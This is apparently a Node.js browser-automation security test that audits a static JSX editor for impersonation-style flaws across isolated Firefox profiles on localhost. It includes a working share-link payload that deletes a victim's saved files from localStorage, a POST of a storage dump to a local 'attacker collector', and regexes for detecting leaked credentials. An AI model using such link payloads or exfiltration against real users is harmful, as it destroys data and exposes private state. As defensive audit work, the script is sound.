/* =============================================================================
   AUD group — "Impersonate other users" mapped to what CAN exist client-only.
   Rows AUD-01..AUD-05 (+ factual evidence rows AUD-02b / AUD-04b).

   Rules honored here:
     - all traffic only to 127.0.0.1 local servers (browser.mjs fence) + allowed CDNs
     - writes only into tests/agents/a/ and tests/results/before/a/
     - record-keeping only; no fixes, no git writes
     - each launch() call = an independent Firefox profile (its own
       localStorage, sessionStorage, indexedDB, cookies)
     - paced: navigations sequential with sleeps, well under 5 req/s to the
       local server (a page load is ~4-6 local files, then a >=1s dwell)

   Run:  cd /tmp/opencode/jsx-live && node tests/agents/a/run.mjs
   ============================================================================= */
import fs from 'node:fs';
import path from 'node:path';
import { fileURLToPath } from 'node:url';

// Always operate with the repo root as cwd (recorder writes relative paths).
const HERE = path.dirname(fileURLToPath(import.meta.url));
process.chdir(path.resolve(HERE, '../../..'));

import { launch, newPage, close, makeShareLink } from '../../lib/browser.mjs';
import { startStatic, startCollector } from '../../lib/servers.mjs';
import { makeRecorder } from '../../lib/recorder.mjs';

const STATIC_PORT = 8901;
const COLLECT_PORT = 8941;

const sleep = (ms) => new Promise((r) => setTimeout(r, ms));

const rec = makeRecorder({ group: 'a' });
async function save(name, content) {
  return rec.saveArtifact(name, content);
}

/* ---------- static file-scan helpers (pure node, no network) ---------- */

function walkRepo() {
  const skip = new Set(['node_modules', '.git', 'tests']);
  const files = [];
  (function walk(dir) {
    for (const e of fs.readdirSync(dir, { withFileTypes: true })) {
      if (e.isDirectory()) { if (!skip.has(e.name)) walk(path.join(dir, e.name)); continue; }
      if (!e.isFile()) continue;
      if (/\.(html|js|css|json|md|txt|svg)$/i.test(e.name)) files.push(path.join(dir, e.name));
      else if (e.name === '.nojekyll') files.push(path.join(dir, e.name));
    }
  }('.'));
  return files;
}

function scan(patterns) {
  const hits = [];
  for (const f of walkRepo()) {
    const src = fs.readFileSync(f, 'utf8');
    src.split('\n').forEach((line, i) => {
      for (const [tag, re] of patterns) {
        if (new RegExp(re.source, re.flags).test(line)) {
          hits.push({ tag, file: path.relative('.', f), line: i + 1, snippet: line.trim().slice(0, 140) });
        }
      }
    });
  }
  return hits;
}

/* ---------- request-host compliance collector (fence proof) ---------- */

function fenceCompliant(log) {
  const allowed = new Set(['127.0.0.1', 'localhost', '[::1]',
    'cdnjs.cloudflare.com', 'cdn.tailwindcss.com', 'fonts.googleapis.com', 'fonts.gstatic.com']);
  const hosts = new Set(); const failed = [];
  for (const raw of log.requests) {
    const isFailed = raw.startsWith('[FAILED');
    const u = isFailed ? (raw.match(/https?:\/\/\S+/) || [null])[0] : raw;
    if (!u || !/^https?:/i.test(u)) continue;
    try {
      const parsed = new URL(u);
      hosts.add(parsed.hostname);
      if (isFailed) failed.push(`${parsed.hostname}${parsed.pathname}`);
    } catch (_) {}
  }
  return {
    compliant: [...hosts].every((h) => allowed.has(h)),
    hosts: [...hosts],
    failedHosts: failed.slice(0, 20),
  };
}

/* ---------- browser-side storage dump ---------- */

async function storageSnapshot(page) {
  return page.evaluate(async () => {
    const out = {
      origin: location.origin,
      localStorage: {}, sessionStorage: {}, cookies: document.cookie, indexedDB: [],
    };
    for (let i = 0; i < localStorage.length; i++) {
      const k = localStorage.key(i);
      out.localStorage[k] = (localStorage.getItem(k) || '').slice(0, 400);
    }
    for (let i = 0; i < sessionStorage.length; i++) {
      const k = sessionStorage.key(i);
      out.sessionStorage[k] = (sessionStorage.getItem(k) || '').slice(0, 400);
    }
    try {
      if (indexedDB.databases) {
        const dbs = await indexedDB.databases();
        out.indexedDB = dbs.map((d) => ({ name: d.name, version: d.version }));
      }
    } catch (e) { out.indexedDB = [`error: ${e.message}`]; }
    return out;
  });
}

const libraryKeys = (snap) => Object.keys(snap.localStorage).filter((k) => /^jsxpress:f_/.test(k));

/* ============================================================================
   AUD-01 — "Take the public key, query every table" equivalent:
   dump every client storage surface as a logged-out fresh visitor and scan the
   repo for embedded credentials. Verdict = is there anything weaponizable?
   ============================================================================ */
async function aud01(staticSrv, collector) {
  const { browser, context } = await launch();
  try {
    const page = await newPage(context);

    await page.goto(`${staticSrv.url}/index.html`, { timeout: 30000 });
    await sleep(900);
    const snapIndex = await storageSnapshot(page);

    await page.goto(`${staticSrv.url}/editor.html`, { timeout: 30000 });
    await sleep(1600); // CDN libs + first auto-run
    const snapEditor = await storageSnapshot(page);

    // Exfil-shape check of the dump itself: transport to an attacker URL is the
    // exfil group's topic; here we only prove WHAT would travel (app state, no secrets).
    const dump = { index: snapIndex, editor: snapEditor };
    const post = await page.evaluate(async (body) => {
      try {
        const r = await fetch('http://127.0.0.1:8941/aud01-dump', { // local attacker collector (allowed: 127.0.0.1)
          method: 'POST', headers: { 'content-type': 'text/plain' }, body: JSON.stringify(body),
        });
        return { status: r.status, body: await r.text() };
      } catch (e) { return { error: String(e) }; }
    }, dump);

    const enum_ = {
      capturedAt: new Date().toISOString(),
      index: snapIndex,
      editor: snapEditor,
      indexedDBDatabases: [...snapIndex.indexedDB, ...snapEditor.indexedDB],
      attemptedPostToCollector: post,
      collectorReceivedEntries: collector.count(),
      requestCompliance: fenceCompliant(page._theftLog),
      secretsFoundInDump: /secret|token|password|key=\w{8,}|bearer /i.test(JSON.stringify(dump)) ? 'match — inspect' : 'none',
    };
    await save('storage-enum.json', enum_);

    // Static repo credential scan
    const patterns = [
      ['credential-assignment', /(?:api[_-]?key|apikey|secret|password|passwd|token|bearer)\s*[:=]\s*["'][^"']{6,}/gi],
      ['aws-access-key', /AKIA[0-9A-Z]{16}/g],
      ['github-token', /gh[pousr]_[A-Za-z0-9]{20,}/g],
      ['openai-style-key', /sk-[A-Za-z0-9]{20,}/g],
      ['slack-token', /xox[baprs]-[A-Za-z0-9-]{10,}/g],
      ['google-api-key', /AIza[0-9A-Za-z_-]{35}/g],
      ['jwt', /eyJ[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}/g],
      ['private-key-block', /-----BEGIN [A-Z ]*PRIVATE KEY-----/g],
    ];
    const secretScan = { patterns: patterns.map((p) => p[0]), hits: scan(patterns) };
    await save('secret-scan.json', secretScan);

    const applied = libraryKeys(snapEditor).length > 0
      || secretScan.hits.some((h) => !/credential-assignment/.test(h.tag) || null);

    rec.record({
      id: 'AUD-01',
      title: 'Enumerate every storage surface + embedded credentials as a fresh logged-out visitor ("query every table")',
      applied,
      how: 'Fresh Firefox profile (no history, no cookies) visits index.html then editor.html; localStorage/sessionStorage/cookies/indexedDB.databases() dumped in-page; full repo file tree grepped with node fs for secret-like strings; the dump POSTed once to the local attacker collector to show exactly what would travel anywhere.',
      request: 'GET /index.html, GET /editor.html (fresh profile); POST /aud01-dump → 127.0.0.1:8941; static grep of repo tree',
      response: `localStorage keys: index=[${Object.keys(snapIndex.localStorage).join(', ') || 'none'}], editor=[${Object.keys(snapEditor.localStorage).join(', ')}]; sessionStorage=[] on both; cookies=''; indexedDB=[]; repo secret-grep hits=${secretScan.hits.length}; collector received ${collector.count()} POST(s) — payload was app-state only (secrets in dump: ${enum_.secretsFoundInDump})`,
      refused: false,
      note: applied
        ? 'Potential weaponizable material found — inspect artifacts.'
        : 'Nothing weaponizable exists: the only client state found is the app\u2019s own UI preference (jsxpress:layout, written by editor init). No tokens, keys, passwords, cookies, IDB databases; no credential-shaped match anywhere in the repo ("tokens" in README refers to CSS design tokens). "Every table" amounts to one layout-preference key per profile.',
      proof: ['tests/results/before/a/storage-enum.json', 'tests/results/before/a/secret-scan.json'],
    });
    console.log(`AUD-01 applied=${applied} editorStorageKeys=[${Object.keys(snapEditor.localStorage).join(', ')}] secretHits=${secretScan.hits.length}`);
  } finally { await close(browser); }
}

/* ============================================================================
   AUD-02 — "Swap the id to read/edit/delete B's data" equivalent:
   two INDEPENDENT browser instances (separate profiles). A seeds a saved
   library file; B tries to see/edit/delete it via crafted URLs and direct
   storage calls. Then AUD-02b: the one channel that DOES act on A's data —
   A itself opening a B-crafted share link.
   ============================================================================ */
const VICTIM_CODE = '// VICTIM-MARKER-42\nfunction App(){ return <div>victim-data</div>; }';
const HOSTILE_DELETE =
  "try { var ks=[]; for (var i=0;i<localStorage.length;i++){ var k=localStorage.key(i); if(k && k.indexOf('jsxpress:f_')===0) ks.push(k);} ks.forEach(function(k){ localStorage.removeItem(k); }); } catch(e){}\n" +
  'function App(){ return <div>gift</div>; }';

async function aud02(staticSrv) {
  const junkLink = makeShareLink(staticSrv.url, { file: 'junk.jsx', code: '<div>junk</div>' });

  // --- instance A: seed victim's library ---------------------------------
  const A = await launch();
  let pageA; let snapA;
  try {
    pageA = await newPage(A.context);
    await pageA.goto(`${staticSrv.url}/editor.html`, { timeout: 30000 });
    await sleep(1400);
    await pageA.click('#editToggle'); // editor pane is hidden in default preview layout; Edit → split
    await sleep(400);
    await pageA.fill('#filename', 'victim.jsx');
    await pageA.fill('#code', VICTIM_CODE);
    await pageA.click('#saveBtn');
    await sleep(600);
    snapA = await storageSnapshot(pageA);
  } catch (e) { await close(A.browser); throw e; }

  // --- instance B: fresh profile, attacker behavior -----------------------
  let attempts = []; let violB = null;
  const B = await launch();
  try {
    const pageB = await newPage(B.context);
    await pageB.goto(`${staticSrv.url}/editor.html`, { timeout: 30000 });
    await sleep(1400);
    const snapB = await storageSnapshot(pageB);
    attempts.push({
      step: 'B: open editor.html fresh',
      fileListCount: await pageB.locator('#fileList .file-item').count(),
      seesVictim: JSON.stringify(snapB.localStorage).includes('victim.jsx'),
    });

    const crafted = [
      ['share link #code=<junk>', junkLink],
      ['?template=counter (real template param)', `${staticSrv.url}/editor.html?template=counter`],
      ['?id=a&file=victim.jsx&role=admin&admin=1 (param guessing)', `${staticSrv.url}/editor.html?id=a&file=victim.jsx&role=admin&admin=1`],
    ];
    for (const [label, url] of crafted) {
      await pageB.goto(url, { timeout: 30000 });
      await sleep(1300);
      const s = await storageSnapshot(pageB);
      attempts.push({
        step: `B: ${label}`,
        fileListCount: await pageB.locator('#fileList .file-item').count(),
        seesVictim: JSON.stringify(s.localStorage).includes('victim.jsx'),
        bLibraryKeys: libraryKeys(s),
      });
    }

    attempts.push({
      step: "B: page.evaluate localStorage.removeItem('jsxpress:f_test') (guessed-key deletion)",
      result: await pageB.evaluate(() => {
        const before = Object.keys(localStorage);
        localStorage.removeItem('jsxpress:f_test');
        return {
          removedAnything: Object.keys(localStorage).length < before.length, // true only if a real key existed in THIS profile
          keysNow: Object.keys(localStorage),
        };
      }),
    });

    violB = fenceCompliant(pageB._theftLog);
  } finally { await close(B.browser); }

  // --- back in A: is the library intact after B's whole session? ----------
  await pageA.goto(`${staticSrv.url}/editor.html`, { timeout: 30000 });
  await sleep(1300);
  const snapAAfter = await storageSnapshot(pageA);
  const intactA =
    JSON.stringify(libraryKeys(snapA)) === JSON.stringify(libraryKeys(snapAAfter)) &&
    JSON.stringify(snapA.localStorage) === JSON.stringify(snapAAfter.localStorage);

  rec.record({
    id: 'AUD-02',
    title: 'Visitor B cannot read/edit/destroy visitor A\u2019s saved library across browser profiles (id-swap analog)',
    applied: false,
    how: 'Two independent firefox.launch() instances (truly separate profiles). A: editor.html, click Save with filename victim.jsx + marker code. B: fresh profile opens editor.html, then a #code=<junk> share link, ?template=counter, guessed params ?id=…&file=…, plus a direct localStorage.removeItem of a guessed key. A re-opened afterwards for a byte-level integrity check.',
    request: 'B: GET /editor.html (+#code<base64>, ?template=counter, ?id=a&file=victim.jsx&role=admin&admin=1); evaluate removeItem()',
    response: `B\u2019s file list read ${attempts.map((a) => a.fileListCount).join(', ')} items in every case (never >0); B\u2019s profile never contained victim.jsx or any jsxpress:f_* key; the removeItem was a no-op. A re-checked after B\u2019s entire session: keys=${JSON.stringify(libraryKeys(snapAAfter))}, byte-identical=${intactA}`,
    refused: false,
    note: 'localStorage is per-browser-profile: A\u2019s profile and B\u2019s profile share zero bytes, and no URL parameter or feature in the app reads or writes another profile\u2019s storage. Read-as-B / edit-as-B / delete-as-B are structurally impossible. AUD-02b covers the one channel that does act on A\u2019s data (requires A itself to open a link).',
    proof: ['tests/results/before/a/aud02-isolation.json'],
  });
  console.log(`AUD-02 applied=false aIntact=${intactA}`);

  /* --- AUD-02b: A itself opens a B-crafted share link ------------------- */
  const pageH = await newPage(A.context);
  const hostileLink = makeShareLink(staticSrv.url, { file: 'gift.jsx', code: HOSTILE_DELETE });
  await pageH.goto(hostileLink, { timeout: 30000 });
  await sleep(1800);
  const after = await pageH.evaluate(() => ({
    fKeys: Object.keys(localStorage).filter((k) => /^jsxpress:f_/.test(k)),
    last: localStorage.getItem('jsxpress:__last'),
  }));
  // verify on a fresh load in A's profile (the sidebar DOM on the hostile page
  // itself was rendered before the payload deleted the keys — factual nuance)
  await pageA.goto(`${staticSrv.url}/editor.html`, { timeout: 30000 });
  await sleep(1200);
  const snapAVerified = await storageSnapshot(pageA);
  const fileListAfter = await pageA.locator('#fileList .file-item').count();
  const destroyed = after.fKeys.length === 0
    && libraryKeys(snapAVerified).length === 0
    && fileListAfter === 0;

  rec.record({
    id: 'AUD-02b',
    title: 'A share link crafted by B, opened by A, deletes/edits A\u2019s local library (code-in-link runs with A\u2019s storage)',
    applied: destroyed,
    how: 'Share link embedding code that iterates every localStorage key prefixed jsxpress:f_ and removes it. Victim A opens the link exactly like any normal shared snippet; the editor\u2019s load flow feeds the payload into its auto-run-on-load init, so it executes synchronously in A\u2019s own profile.',
    request: 'GET /editor.html#code=<base64{ n:"gift.jsx", c:<deleteAllSavedFiles payload> }> — opened by A in A\u2019s profile',
    response: `After load: remaining jsxpress:f_* keys=${JSON.stringify(after.fKeys)}; verified on reload in A\u2019s profile: jsxpress:f_* keys=${JSON.stringify(libraryKeys(snapAVerified))}, library items rendered=${fileListAfter}, jsxpress:__last pointer=${after.last ? 'still present (dangling)' : 'gone'} → destroyed=${destroyed}`,
    refused: false,
    note: 'Factual observation only. There is no allowlist or consent step before embedded link-code runs on load, so arbitrary localStorage mutation against whoever opens the link is possible (deletion demonstrated; overwrite via setItem is the same primitive, not separately exercised). Rendering nuance observed: on the hostile load the sidebar still showed the item because the file list renders before run() — storage was verifiably empty on reload.',
    proof: ['tests/results/before/a/aud02-isolation.json'],
  });
  console.log(`AUD-02b applied=${destroyed} (deletion-via-link observed)`);

  await save('aud02-isolation.json', {
    victimSeed: { keys: libraryKeys(snapA), name: 'victim.jsx', fullSnapshot: snapA },
    bAttempts: attempts,
    fenceB: violB,
    aIntactAfterB: intactA,
    hostileLinkPayload: HOSTILE_DELETE,
    afterHostileLink: { inPage: after, reloadedKeys: libraryKeys(snapAVerified), fileListAfter, destroyed },
    fenceA: fenceCompliant(pageA._theftLog),
  });

  await close(A.browser);
}

/* ============================================================================
   AUD-03 — "Add role:admin to own request" equivalent: is there ANY
   role/permission primitive a visitor could elevate? URL pollution + runtime
   window/state scan + static grep.
   ============================================================================ */
async function aud03(staticSrv) {
  const { browser, context } = await launch();
  try {
    const page = await newPage(context);
    await page.goto(`${staticSrv.url}/editor.html?role=admin&admin=1`, { timeout: 30000 });
    await sleep(1500);

    const runtime = await page.evaluate(() => {
      const pat = /role|admin|permission|priv|scope|auth|token|session/i;
      const noise = new Set(['window', 'document', 'location', 'navigator']);
      const winProps = Object.getOwnPropertyNames(window)
        .filter((k) => pat.test(k) && !noise.has(k));
      const ls = Object.keys(localStorage).filter((k) => pat.test(k) || /jsxpress/.test(k));
      const ss = Object.keys(sessionStorage).filter((k) => pat.test(k));
      const types = {
        window_role: typeof window.role,
        window_isAdmin: typeof window.isAdmin,
        window_userRole: typeof window.userRole,
        window_permissions: typeof window.permissions,
        window_currentUser: typeof window.currentUser,
      };
      const ariaRoles = [...new Set([...document.querySelectorAll('[role]')].map((e) => e.getAttribute('role')))];
      const buttons = [...document.querySelectorAll('button.tool, button.layout-btn')]
        .map((b) => ({ id: b.id || b.className, disabled: !!b.disabled }));
      return {
        searchedPattern: String(pat),
        windowRoleLikeProps: winProps,
        localStorageKeys: ls,
        sessionStorageKeys: ss,
        typeofChecks: types,
        ariaRoles,
        disabledButtons: buttons.filter((b) => b.disabled),
        buttonCount: buttons.length,
        urlEcho: location.search,
      };
    });

    const staticScan = {
      roleStateAssignments: scan([['role-state-assignment', /\b(?:role|isadmin|userrole|permissions?)\s*[:=]\s*[\w"'{[]/gi]]),
      adminLiteral: scan([['admin-literal', /\badmin\b/gi]]),
    };
    await save('aud03-role-scan.json', {
      runtime,
      static: staticScan,
      classification: 'HTML-file matches are WAI-ARIA presentation attributes (role="group"/"separator"/"status" in editor.html); zero role-state identifiers exist in any .js file; "admin" appears nowhere in the repo.',
    });

    const anyGating = runtime.windowRoleLikeProps.length > 0
      || staticScan.roleStateAssignments.some((h) => /\.js$/i.test(h.file));
    rec.record({
      id: 'AUD-03',
      title: 'Privilege/role elevation via URL (?role=admin&admin=1) — no role primitive exists to elevate',
      applied: anyGating,
      how: 'Loaded editor.html?role=admin&admin=1 into a fresh profile; in-page scan of all window own-properties, localStorage/sessionStorage keys, typeof checks for role-like identifiers, [role] HTML attributes and disabled buttons as "feature gates"; node-grep of the whole repo for role/admin/permission state assignments.',
      request: 'GET /editor.html?role=admin&admin=1',
      response: `URL accepted verbatim but consumed by nothing: windowRoleLikeProps=[], typeof window.role/isAdmin/userRole/permissions/currentUser all "undefined", storage keys=[${runtime.localStorageKeys.join(', ')}], ariaRoles=${JSON.stringify(runtime.ariaRoles)} (ARIA only), disabled buttons=${runtime.disabledButtons.length}/${runtime.buttonCount}, static .js matches=${staticScan.roleStateAssignments.filter((h) => !/\.html$/i.test(h.file)).length}`,
      refused: false,
      note: 'N/A with runtime + static proof: authentication, authorization and roles do not exist anywhere in the codebase. There is no request object, no server, no session — the polluted parameters are dead input. The only "role" strings in the repo are ARIA accessibility attributes on layout/toast elements.',
      proof: ['tests/results/before/a/aud03-role-scan.json'],
    });
    console.log(`AUD-03 applied=${anyGating} adminLiteralHits=${staticScan.adminLiteral.length}`);
  } finally { await close(browser); }
}

/* ============================================================================
   AUD-04 — "Reuse a password reset link twice": N/A (no forms/passwords).
   AUD-04b — the real double-use analog: the same share link re-runs its
   embedded code on every load.
   ============================================================================ */
async function aud04(staticSrv) {
  const { browser, context } = await launch();
  try {
    // runtime DOM inventory on both pages
    const inventory = { pages: {} };
    for (const p of ['index.html', 'editor.html']) {
      const page = await newPage(context);
      await page.goto(`${staticSrv.url}/${p}`, { timeout: 30000 });
      await sleep(1400);
      inventory.pages[p] = await page.evaluate(() => ({
        forms: document.querySelectorAll('form').length,
        passwordInputs: document.querySelectorAll('input[type=password]').length,
        emailInputs: document.querySelectorAll('input[type=email]').length,
        inputs: [...document.querySelectorAll('input')].map((i) => ({ id: i.id, type: i.type })),
        textareas: [...document.querySelectorAll('textarea')].map((t) => t.id),
        cookies: document.cookie,
        authThemedElements: [...document.querySelectorAll('a,button')]
          .map((e) => (e.textContent || '').trim().toLowerCase())
          .filter((t) => /log ?(in|out)|sign ?(in|up)|password|reset/.test(t)),
      }));
      await page.close();
      await sleep(400);
    }
    const staticScan = {
      htmlFormTags: scan([['form-tag', /<form[\s>]/gi]]),
      passwordTypes: scan([['password-type', /type=["']?password/gi]]),
      resetLinkCopy: scan([['reset-copy', /reset[-_ )]?\s?password|forgot[-_ )]?\s?(your )?password|reset link/gi]]),
    };
    await save('aud04-form-inventory.json', {
      runtime: inventory,
      static: {
        ...staticScan,
        note: 'The single <form match in assets/templates.js is the sample source code of the form-building demo TEMPLATE (a JS string shown inside the editor) — never a page-level form; the runtime scan reports forms=0 on both pages.',
      },
    });

    const noAuthSurface = Object.values(inventory.pages)
      .every((p) => p.forms === 0 && p.passwordInputs === 0 && p.cookies === '' && p.authThemedElements.length === 0);
    rec.record({
      id: 'AUD-04',
      title: 'Password-reset link double-use — N/A: zero forms, password inputs, cookies or auth copy site-wide',
      applied: !noAuthSurface,
      how: 'Runtime DOM inventory (forms, password inputs, auth-themed links/elements, cookies) on index.html and editor.html in a fresh profile + node-grep of the repo for <form, type=password and reset-link copy.',
      request: 'GET /index.html, GET /editor.html (DOM scan); static grep',
      response: `forms: index=${inventory.pages['index.html'].forms}, editor=${inventory.pages['editor.html'].forms}; password inputs: 0/0; email inputs: 0/0; cookies on both pages: ''; auth-themed elements: []; static form-tag hit exists only inside the templates.js demo-template string`,
      refused: false,
      note: 'There is nothing that authenticates: no account, no password, no reset token, and no server to consume one — the attack has no referent here. Double-use of real links is covered by AUD-04b.',
      proof: ['tests/results/before/a/aud04-form-inventory.json'],
    });
    console.log(`AUD-04 applied=${!noAuthSurface} forms=0 passwords=0 cookies=''`);

    // ---------- AUD-04b: same share link opened twice -----------------
    const page = await newPage(context);
    const dblPayload =
      "function App(){\n" +
      "  var n = Number(window.localStorage.getItem('jsxpress:probe_dbl') || '0') + 1;\n" +
      "  window.localStorage.setItem('jsxpress:probe_dbl', String(n));\n" +
      "  return <div>{'probe-run ' + n}</div>;\n}";
    const link = makeShareLink(staticSrv.url, { file: 'probe.jsx', code: dblPayload });
    const runs = [];
    for (let i = 1; i <= 2; i++) {
      const pg = await newPage(context);
      await pg.goto(link, { timeout: 30000 });
      await sleep(1900);
      const st = await pg.evaluate(() => ({
        counter: localStorage.getItem('jsxpress:probe_dbl'),
        previewText: ((document.getElementById('preview') || {}).textContent || '').slice(0, 60),
      }));
      runs.push({ open: i, probeCounter: st.counter, previewText: st.previewText });
      await pg.close();
      await sleep(500);
    }
    rec.record({
      id: 'AUD-04b',
      title: 'Observed fact: the SAME share link re-executes its embedded code on every load (double-use analog)',
      applied: true,
      how: 'One profile, the identical #code= link opened twice from two sequential tabs. The embedded component increments a localStorage counter each time the editor\u2019s auto-run-on-load init executes it; the preview itself echoes the run number.',
      request: 'GET /editor.html#code=<base64{ n:"probe.jsx", c:<counter payload> }> — same URL opened twice',
      response: `open1: counter=${runs[0].probeCounter}, preview="${runs[0].previewText}"; open2 (identical URL): counter=${runs[1].probeCounter}, preview="${runs[1].previewText}"`,
      refused: false,
      note: 'Observed fact recorded for the main agent (matches known-issue: #code= links auto-execute on load; no allowlist/consent step) \u2014 each identical URL replay re-runs the arbitrary code it carries.',
      proof: ['tests/results/before/a/aud04-execution-log.json'],
    });
    console.log(`AUD-04b applied=true counters=${runs.map((r) => r.probeCounter).join('→')}`);
    await save('aud04-execution-log.json', { linkPayloadRun: link, runs, fence: fenceCompliant(page._theftLog) });
  } finally { await close(browser); }
}

/* ============================================================================
   AUD-05 — "Logged-out access to private pages": N/A (everything is public by
   design). Record exactly what any visitor can reach.
   ============================================================================ */
async function aud05(staticSrv) {
  const { browser, context } = await launch();
  try {
    const page = await newPage(context);

    await page.goto(`${staticSrv.url}/index.html`, { timeout: 30000 });
    await sleep(900);
    const home = await page.evaluate(() => ({
      title: document.title,
      anchors: [...document.querySelectorAll('a[href]')].map((a) => ({
        href: a.getAttribute('href'), text: (a.textContent || '').trim().slice(0, 40),
      })),
      disabledElements: [...document.querySelectorAll('[disabled]')].length,
    }));

    await page.goto(`${staticSrv.url}/editor.html`, { timeout: 30000 });
    await sleep(1900);
    const editor = await page.evaluate(() => ({
      title: document.title,
      templatesAvail: document.querySelectorAll('#templateList .template-item').length,
      libraryEmptyVisible: document.getElementById('emptyLibrary').style.display !== 'none',
      previewCharCount: ((document.getElementById('preview') || {}).textContent || '').length,
      toolbarButtons: [...document.querySelectorAll('button.tool')].map((b) => ({ id: b.id, disabled: !!b.disabled })),
      ranWithoutLogin: true,
    }));

    await save('aud05-anchors.json', {
      home, editor,
      verdict: 'Full reach with zero login: both pages, all six templates, editor + preview + save/share/upload/download all usable from a blank profile.',
    });

    rec.record({
      id: 'AUD-05',
      title: '\u201CLogged-out access to private pages\u201D — N/A: no private pages exist; every surface is public by design',
      applied: false,
      how: 'Fresh blank profile loads index.html and editor.html; enumerated every <a href> on the home page, template availability, toolbar buttons, and confirmed the editor auto-runs and renders a preview with no gate, wall or session step in between.',
      request: 'GET /index.html; GET /editor.html (fresh profile)',
      response: `index: title="${home.title}", anchors=${home.anchors.length} [${home.anchors.map((a) => a.href).join(', ')}], disabled elements=${home.disabledElements}; editor: title="${editor.title}", templates listed=${editor.templatesAvail}, preview chars=${editor.previewCharCount}, disabled buttons=${editor.toolbarButtons.filter((b) => b.disabled).length} — full editor usable with zero credentials`,
      refused: false,
      note: 'Honest closure: "private" is undefined in this architecture — pages are static files served identically to everyone, and the editor\u2019s full functionality works from a blank profile. The closest thing to a "privilege" (saved personal files) lives entirely inside the visitor\u2019s own browser profile (see AUD-02), reachable by no one else.',
      proof: ['tests/results/before/a/aud05-anchors.json'],
    });
    console.log(`AUD-05 applied=false anchors=${home.anchors.length} templates=${editor.templatesAvail} previewChars=${editor.previewCharCount}`);
  } finally { await close(browser); }
}

/* -------------------------------------------------------------------- main */

async function main() {
  const staticSrv = await startStatic(STATIC_PORT);
  const collector = await startCollector(COLLECT_PORT);
  console.log(`[srv] static=${staticSrv.url} collector=${collector.url}`);

  try {
    await aud01(staticSrv, collector);
    await aud02(staticSrv);
    await aud03(staticSrv);
    await aud04(staticSrv);
    await aud05(staticSrv);
  } catch (e) {
    console.error('FATAL:', e);
    process.exitCode = 1;
  } finally {
    try { await rec.flush(); } catch (e2) { console.error('flush error:', e2); }
    try { await collector.close(); } catch (_) {}
    try { await staticSrv.close(); } catch (_) {}
  }
  console.log('report: tests/results/before/a/report.md');
}

main();
